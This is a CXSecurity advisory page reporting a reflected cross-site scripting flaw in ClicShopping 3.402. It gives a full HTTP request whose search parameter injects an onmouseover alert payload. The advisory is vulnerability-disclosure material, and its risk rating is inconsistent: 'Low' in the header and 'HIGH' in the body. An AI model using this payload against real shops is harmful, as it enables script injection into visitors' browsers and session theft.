---
title: ClicShopping 3.402 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2022110033
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-22
fetch_date: 2025-10-03T23:21:27.296274
---

# ClicShopping 3.402 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ClicShopping 3.402 Cross Site Scripting** **2022.11.21**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

## Title: ClicShopping\_V3-Version3.402 XSS-Reflected
## Author: nu11secur1ty
## Date: 11.20.2022
## Vendor: https://www.clicshopping.org/forum/
## Software: https://github.com/ClicShopping/ClicShopping\_V3/releases/tag/version3\_402
## Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/clicshopping.org/2022/ClicShopping\_V3
## Description:
The name of an arbitrarily supplied URL parameter is copied into the
value of an HTML tag attribute which is encapsulated in double
quotation marks.
The attacker can trick users to open a very dangerous link or he can
get sensitive information, also he can destroy some components of your
system.
## STATUS: HIGH Vulnerability
[+] Payload:
```js
GET /ClicShopping\_V3-version3\_402/index.php?Search&AdvancedSearch&bel9c%22onmouseover%3d%22alert(`Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole`)%22style%3d%22position%3aabsolute%3bwidth%3a100%25%3bheight%3a100%25%3btop%3a0%3bleft%3a0%3b%22zgm9j=1
HTTP/1.1
Host: pwnedhost.com
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107
Safari/537.36
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="107", "Chromium";v="107"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
```
## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/clicshopping.org/2022/ClicShopping\_V3)
## Proof and Exploit:
[href](https://streamable.com/mgbftx)
## Time spent
`1:00`

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110033)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top